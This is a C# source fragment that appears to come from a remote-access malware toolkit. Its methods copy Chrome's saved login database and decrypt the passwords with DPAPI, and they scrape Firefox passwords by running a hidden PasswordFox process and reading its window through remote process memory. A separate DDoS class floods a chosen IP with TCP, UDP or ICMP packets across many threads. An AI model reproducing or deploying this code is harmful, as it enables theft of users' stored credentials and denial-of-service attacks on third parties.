            /// <summary>
            /// Get the algorithm of the hash
            /// </summary>
            HP_ALGID = 0x0001,
            /// <summary>
            /// Get the value of the hash
            /// </summary>
            HP_HASHVAL = 0x0002,
            /// <summary>
            /// Get the size of the hash
            /// </summary>
            HP_HASHSIZE = 0x0004
        }

        /// <summary>
        /// Get Crypto Context
        /// </summary>
        /// <param name="hProv">Pointer to the crypto handler provider</param>
        /// <param name="pszContainer">Container</param>
        /// <param name="pszProvider">Provider</param>
        /// <param name="dwProvType">The crypto provider type</param>
        /// <param name="dwFlags">Crypto context flags</param>
        /// <returns>Result of the acquire</returns>
        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptAcquireContext(out IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
        /// <summary>
        /// Create a hashing provider
        /// </summary>
        /// <param name="hProv">Crypto provider</param>
        /// <param name="algId"><see cref="HashAlgorithm"/> to use</param>
        /// <param name="hKey">The key to hash with</param>
        /// <param name="dwFlags">Hashing flags</param>
        /// <param name="phHash">A pointer the hashing provider output</param>
        /// <returns>Result of the creation</returns>
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CryptCreateHash(IntPtr hProv, ALG_ID algId, IntPtr hKey, uint dwFlags, ref IntPtr phHash);
        /// <summary>
        /// Create a new hash
        /// </summary>
        /// <param name="hHash">The hash provider to use</param>
        /// <param name="pbData">The data to create the hash of</param>
        /// <param name="dataLen">The length of the data</param>
        /// <param name="flags">Hashing flags</param>
        /// <returns>Result of the hash creation</returns>
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint flags);
        /// <summary>
        /// Get parameters of a hash
        /// </summary>
        /// <param name="hHash">The hashing provider</param>
        /// <param name="dwParam">The parameter to get</param>
        /// <param name="pbData">The hash</param>
        /// <param name="pdwDataLen">The length of the hash</param>
        /// <param name="dwFlags">Get Parameter flags</param>
        /// <returns>The result of getting the paramter</returns>
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, [Out] byte[] pbData, ref uint pdwDataLen, uint dwFlags);
        /// <summary>
        /// Destroy a hashing provider
        /// </summary>
        /// <param name="hHash">The hashing provider to destroy</param>
        /// <returns>The result of destroying the hash provider</returns>
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CryptDestroyHash(IntPtr hHash);
        /// <summary>
        /// Release a crypto context
        /// </summary>
        /// <param name="hProv">The crypto context to release</param>
        /// <param name="dwFlags">The relase flags</param>
        /// <returns>The result of the release</returns>
        [DllImport("Advapi32.dll", EntryPoint = "CryptReleaseContext", CharSet = CharSet.Unicode, SetLastError = true)]
        extern static bool CryptReleaseContext(IntPtr hProv, Int32 dwFlags);

        /// <summary>
        /// Get Google Chrome Passwords
        /// </summary>
        /// <returns>An array of goolge chrome stored passwords</returns>
        public string[] GetGCpw()
        {
            string file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data"; //The password file's path
            string cpPath = Application.StartupPath + "\\logindata";
            if (File.Exists(cpPath)) File.Delete(cpPath); //Remove local copy
            if (!File.Exists(file)) //Check if the password file exists
            {
                return new string[] { "failed" }; //If not we failed decryption
            }
            File.Copy(file, cpPath); //Copy the file to our folder (to prevent SQL blocking our SELECT)
            List<string> gcLogin = new List<string>(); //Store the results here
            string sql = "SELECT username_value, password_value, origin_url FROM logins WHERE blacklisted_by_user = 0"; //SQL Query for passwords
            using (SQLiteConnection c = new SQLiteConnection("Data Source=logindata;Version=3;")) //Connect to the database
            {
                c.Open(); //Open the connection
                using (SQLiteCommand cmd = new SQLiteCommand(sql, c)) //Execute the command
                {
                    using (SQLiteDataReader r = cmd.ExecuteReader()) //Read the command results
                    {
                        while (r.Read()) //Read the results
                        {
                            string username = Convert.ToString(r["username_value"]); //Get the username
                            byte[] passwordBuffer = (byte[])r.GetValue(1); //Get the buffer of password
                            string password = DecryptGCpassword(passwordBuffer); //Decrypt the password
                            string url = Convert.ToString(r["origin_url"]); //Get the URL
                            string dataString = url + "§" + username + "§" + password; //Craft data string
                            gcLogin.Add(dataString); //Append to result
                        }
                    }
                }
            }

            if (gcLogin.Count == 0) //No passwords
            {
                gcLogin.Add("failed"); //Failed to decrypt
            }

            return gcLogin.ToArray(); //Return passwords
        }

        /// <summary>
        /// Decrypt a google chrome password
        /// </summary>
        /// <param name="blob">The data to decrypt</param>
        /// <returns>The plain text password</returns>
        public string DecryptGCpassword(byte[] blob)
        {
            byte[] decrypted = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser); //Decrypt the data
            return Encoding.UTF8.GetString(decrypted); //Decode and return the data
        }

        private const string FFRegKey = "SOFTWARE\\Mozilla\\Mozilla Firefox"; //FireFox registry key
                                                                              // Result caching for ff install checking
        private bool FFInstallCache = false;
        private bool FFCacheSet = false;

        /// <summary>
        /// Check if firefox is installed
        /// </summary>
        /// <returns>True if firefox is installed, otherwise false</returns>
        private bool IsFFinstalled()
        {
            if (FFCacheSet) return FFInstallCache; // Check the cache
            RegistryKey key = Registry.LocalMachine.OpenSubKey(FFRegKey); //Open the key
            FFInstallCache = key != null; // Set the cache
            FFCacheSet = true; // Set cache flag
            return FFInstallCache; // Check if FF is installed
        }

        /// <summary>
        /// Get firefox passwords
        /// </summary>
        /// <returns>An array of firefox passwords</returns>
        public string[] GetFFpw()
        {
            if (!IsFFinstalled()) return new string[] { "failed" }; //If FF isn't installed we failed decryption
            const int fflvOffset = 2; //The passwords listView control index
                                      //Start decryptor process
            ProcessStartInfo info = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "ff.exe"
            };

            Process p = new Process
            {
                StartInfo = info
            };

            p.Start();
            Thread.Sleep(3000);
            IntPtr vTest = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "PasswordFox", null); //Find the decryptor's window
                                                                                        //Console.WriteLine(vTest.ToString("X"));
            IntPtr listView = EnumWindows(vTest, fflvOffset); //Get the listView of the decryptor
            int items = GetItemsCount(listView); //Get the count of the listView's items
            List<string> lvItems = new List<string>(); //List of passwords
            if (items == 0) //No passwords saved
            {
                p.Kill(); //Stop the decryptor
                return new string[] { "failed" }; //We failed decryption
            }

            StringBuilder listitem = new StringBuilder();
            for (int i = 0; i < items; i++)
            {
                for (int t = 0; t < ffprColumn; t++) //Loop through the count of the columns
                {
                    string currentSubitem = GetSubItem(t, i, "ff", listView); //Get the subitem of this column
                    listitem.Append(currentSubitem);
                    if (t + 1 != ffprColumn) //If next column isn't out of bounds
                    {
                        //currentSubitem += "§"; //Add data delimiter
                        listitem.Append("§"); // Add data delimiter
                    }
                }

                lvItems.Add(listitem.ToString()); //Add the current item to the item list
                listitem.Clear();
            }

            // Dereference the string builder
            listitem = null;
            p.Kill(); //Kill the decryptor

            return lvItems.ToArray(); //Return the list of items
        }

        /// <summary>
        /// Get the items of a <see cref="ListView"/>
        /// </summary>
        /// <param name="lvHandle">The handle of the <see cref="ListView"/></param>
        /// <returns>The number of items in the <see cref="ListView"/></returns>
        private int GetItemsCount(IntPtr lvHandle)
        {
            IntPtr result = SendMessageA(lvHandle, LVM_GETITEMCOUNT, IntPtr.Zero, IntPtr.Zero); //Send the query message
            return result.ToInt32(); //Return the number of items in the listView
        }

        /// <summary>
        /// Get a subitem of an item in a <see cref="ListView"/>
        /// </summary>
        /// <param name="subitem">The ID of the subitem to get</param>
        /// <param name="item">The ID of the item to get the subitems of</param>
        /// <param name="processName">The name of the exectuing process</param>
        /// <returns>The text of the subitem</returns>
        private String GetSubItem(int subitem, int item, String processName, IntPtr listView)
        {
            IntPtr extractBufferLength = (IntPtr)512; //Size of the text buffer
            int procID = Process.GetProcessesByName(processName)[0].Id; //Get the ID of the process
                                                                        //Get the handle of the process
            IntPtr pHandle = OpenProcess(ProcessAccessFlags.VirtualMemoryOperation | ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite, false, procID);
            //Allocate the textbuffer in the process
            IntPtr pExtractBuffer = VirtualAllocEx(pHandle, (IntPtr)0, extractBufferLength, AllocationType.Commit, MemoryProtection.ReadWrite);
            LVITEM lvi = new LVITEM
            {
                mask = LVIF_TEXT,
                cchTextMax = extractBufferLength.ToInt32(),
                iSubItem = subitem,
                pszText = pExtractBuffer
            }; //Create the listView item object
               //Allocate memory for the listView item object
            IntPtr pStructBuffer = VirtualAllocEx(pHandle, (IntPtr)0, (IntPtr)Marshal.SizeOf(lvi), AllocationType.Commit, MemoryProtection.ReadWrite);
            WriteStructureToProcessMemory(pHandle, pStructBuffer, lvi); //Write the listViewItem object to the remote process memory
            IntPtr length = SendMessageA(listView, LVM_GETITEM, (IntPtr)item, pStructBuffer); //Send message to the remote window
            byte[] retBuffer = new byte[length.ToInt32() * 2]; //Create a buffer for the results
            IntPtr bytesRead = IntPtr.Zero;
            ReadProcessMemory(pHandle, pExtractBuffer, retBuffer, length.ToInt32() * 2, out bytesRead); //Read the subitem's text from the remote process memory
            string subItemText = Encoding.Unicode.GetString(retBuffer); //Get the text of the subitem
            VirtualFreeEx(pHandle, pExtractBuffer, 0, FreeType.Release); //Free the text buffer from the memory
            VirtualFreeEx(pHandle, pStructBuffer, 0, FreeType.Release); //Free the remote structure buffer
            CloseHandle(pHandle); //Close the process handle
            return subItemText; //Return the text of the subitem
        }

        /// <summary>
        /// Write a struct to process memory
        /// </summary>
        /// <param name="processHandle">The handle of the remote <see cref="Process"/></param>
        /// <param name="BaseAddress">The address to write the struct to</param>
        /// <param name="obj">The struct to write</param>
        private void WriteStructureToProcessMemory(IntPtr processHandle, IntPtr BaseAddress, LVITEM obj)
        {
            UInt32 sizeOfLVITEM = (UInt32)Marshal.SizeOf(typeof(LVITEM)); //Get the size of the struct
            IntPtr ptrToLvItem = Marshal.AllocHGlobal((int)sizeOfLVITEM); //Allocate space for struct bytes
            Marshal.StructureToPtr(obj, ptrToLvItem, true); //Load struct bytes to local memory

            WriteProcessMemory(processHandle, BaseAddress, ptrToLvItem, sizeOfLVITEM, UIntPtr.Zero); //Write data to remote process memory
        }

        /// <summary>
        /// Get the byte array form of a struct
        /// </summary>
        /// <param name="str">The struct to convert</param>
        /// <returns>The <see cref="byte[]"/> representation of the struct</returns>
        private byte[] GetBytes(LVITEM str)
        {
            int size = Marshal.SizeOf(str); //Get the size of the struct
            byte[] arr = new byte[size]; //Create the buffer for the result

            IntPtr ptr = Marshal.AllocHGlobal(size); //Alocate space for the data
            Marshal.StructureToPtr(str, ptr, true); //Create a pointer to the structure
            Marshal.Copy(ptr, arr, 0, size); //Copy the structure to the result
            Marshal.FreeHGlobal(ptr); //Free the structure pointer
            return arr; //Return the result
        }

        /// <summary>
        /// Loop through the given number of child windows
        /// </summary>
        /// <param name="mainHandle">The parent windows handle</param>
        /// <param name="lvLocation">The number of childs to loop thorugh</param>
        /// <returns>A handle to the resulting child window</returns>
        private IntPtr EnumWindows(IntPtr mainHandle, int lvLocation)
        {
            IntPtr lvPtr = IntPtr.Zero; //Result pointer
            IntPtr prevPtr = IntPtr.Zero; //Pointer to the previous window
            int enumPos = 0; //Index for looping

            while (true)
            {
                if (enumPos == 0) //First loop
                {
                    prevPtr = FindWindowEx(mainHandle, (IntPtr)0, null, null); //Get the first child of the parent
                }
                else //Not first loop
                {
                    prevPtr = FindWindowEx(mainHandle, prevPtr, null, null); //Get the child after the current child
                }
                //Console.WriteLine("Aquired Handle: " + prevPtr.ToString("X"));
                if (enumPos == lvLocation) break; //If indexes match break out

                enumPos++; //Increment the index
            }

            lvPtr = prevPtr; //Set the result

            return lvPtr; //Return the result
        }
    }

    /// <summary>
    /// The DDoS Module
    /// </summary>
    public class DDoS
    {
        /// <summary>
        /// The IP address to attack
        /// </summary>
        private readonly string ip = "";
        /// <summary>
        /// The port to attack on
        /// </summary>
        private readonly int port = 0;
        /// <summary>
        /// The protocol to use
        /// </summary>
        private readonly int prot = 0;
        /// <summary>
        /// The packet size to send
        /// </summary>
        private readonly int packetSize = 0;
        /// <summary>
        /// The number of <see cref="Thread"/>s to attack with
        /// </summary>
        private readonly int Threads = 0;
        /// <summary>
        /// The delay to wait between packet sends
        /// </summary>
        private readonly int delay = 0;
        /// <summary>
        /// TCP Protocol ID
        /// </summary>
        private const int protocol_tcp = 0;
        /// <summary>
        /// UDP Protocol ID
        /// </summary>
        private const int protocol_udp = 1;
        /// <summary>
        /// ICMP Protocol ID
        /// </summary>
        private const int protocol_icmp = 2;
        /// <summary>
        /// DDoSing Thread
        /// </summary>
        Thread t_ddos;
        /// <summary>
        /// DDoS Kill Switch
        /// </summary>
        bool kill = false;

        /// <summary>
        /// Create a new DDoS Attack
        /// </summary>
        /// <param name="cIp">The IP To Attack</param>
        /// <param name="cPort">The port to attack on</param>
        /// <param name="cProtocol">The protocol to use</param>
        /// <param name="cPacketSize">The packet size to send</param>
        /// <param name="cThreads">The number of threads to attack with</param>
        /// <param name="cDelay">The delay between packet sends</param>
        public DDoS(string cIp, string cPort, string cProtocol, string cPacketSize, string cThreads, string cDelay)
        {
            //Set all DDoS variables
            ip = cIp;
            port = int.Parse(cPort);
            switch (cProtocol)
            {
                case "TCP":
                    prot = protocol_tcp;
                    break;

                case "UDP":
                    prot = protocol_udp;
                    break;

                case "ICMP ECHO (Ping)":
                    prot = protocol_icmp;
                    break;
            }

            packetSize = int.Parse(cPacketSize);
            Threads = int.Parse(cThreads);
            delay = int.Parse(cDelay);
        }

        /// <summary>
        /// Start the attack
        /// </summary>
        public void StartDdos()
        {
            //Create the thread and start attacking
            t_ddos = new Thread(new ThreadStart(DDoSTarget));
            t_ddos.Start();
        }

        /// <summary>
        /// Main Attacking Thread
        /// </summary>
        private void DDoSTarget()
        {
            List<Thread> subThreads = new List<Thread>(); //List of sub threads

            //Determine the protocol, create threads and start attacking

            if (prot == protocol_tcp)
            {
                for (int i = 0; i < Threads; i++)
                {
                    Thread t = new Thread(new ThreadStart(DDoSTcp));
                    t.Start();
                    subThreads.Add(t);
                }
            }

            if (prot == protocol_udp)
            {
                for (int i = 0; i < Threads; i++)
                {
                    Thread t = new Thread(new ThreadStart(DDoSUdp));
                    t.Start();
                    subThreads.Add(t);
                }
            }

            if (prot == protocol_icmp)
            {
                for (int i = 0; i < Threads; i++)
                {
                    Thread t = new Thread(new ThreadStart(DDoSIcmp));
                    t.Start();
                    subThreads.Add(t);
                }
            }

            while (!kill) ; //Pause execution on this thread (ddos is still running at this point)
            foreach (Thread t in subThreads)
            {
                t.Abort();
            }

            t_ddos.Abort();
        }

        /// <summary>
        /// DDoS Using Icmp
        /// </summary>
        private void DDoSIcmp()
        {
            while (true)
            {
                if (kill) break;
                try
                {
                    System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping(); //Create a new ping request
                    byte[] junk = Encoding.Unicode.GetBytes(GenerateData()); //Get the data to send
                    ping.Send(ip, 1000, junk); //Send the ping to the target
                    Thread.Sleep(delay); //Wait if delay is set
                }
                catch (Exception ex)
                {
                    Console.WriteLine("ddos icmp error: " + ex.Message);
                }
            }
        }

        /// <summary>
        /// DDoS Using Udp
        /// </summary>
        private void DDoSUdp()
        {
            while (true)
            {
                if (kill) break;

                try
                {
                    UdpClient client = new UdpClient(); //Create a UDP Client
                    client.Connect(ip, port); //Connect to the server
                    byte[] junk = Encoding.Unicode.GetBytes(GenerateData()); //Get the data to send
                    client.Send(junk, junk.Length); //Send the data to the server
                    client.Close(); //Close the connection
                    Thread.Sleep(delay); //Wait if delay is set
                }
                catch (Exception ex)
                {
                    Console.WriteLine("ddos udp error: " + ex.Message);
                }
            }
        }

        /// <summary>
        /// DDoS Using Tcp
        /// </summary>
        private void DDoSTcp()
        {
            while (true)
            {
                if (kill) break;

                try
                {
                    TcpClient client = new TcpClient(); //Create a new client
                    client.Connect(ip, port); //Connect to the server
                    NetworkStream ns = client.GetStream(); //Get the stream of the server
                    byte[] junk = Encoding.Unicode.GetBytes(GenerateData()); //Get the data to send
                    ns.Write(junk, 0, junk.Length); //Send data to server
                                                    //Shutdown the connection
                    ns.Close();
                    ns.Dispose();
                    client.Close();
                    Thread.Sleep(delay); //Wait if delay is set
                }
                catch (Exception ex)
                {
                    Console.WriteLine("ddos tcp error: " + ex.Message);
                }
            }
        }

        /// <summary>
        /// Cache generate data call result
        /// </summary>
        private string gdCache = string.Empty;

        /// <summary>
        /// Generate random random with the size given in packetSize
        /// </summary>
        /// <returns>Random string data</returns>
        private string GenerateData()
        {
            // Check the cache first
            if (gdCache != string.Empty) return gdCache;
            // Builder to append data to
            StringBuilder data = new StringBuilder();

            for (int i = 0; i < packetSize; i++)
            {
                data.Append("A"); // Add data to the string builder
            }

            // Set the cache
            gdCache = data.ToString();

            return gdCache; //Return the data
        }

        /// <summary>
        /// Stop DDoSing target
        /// </summary>
        public void StopDDoS()
        {
            kill = true; //Set the kill switch
        }
    }
}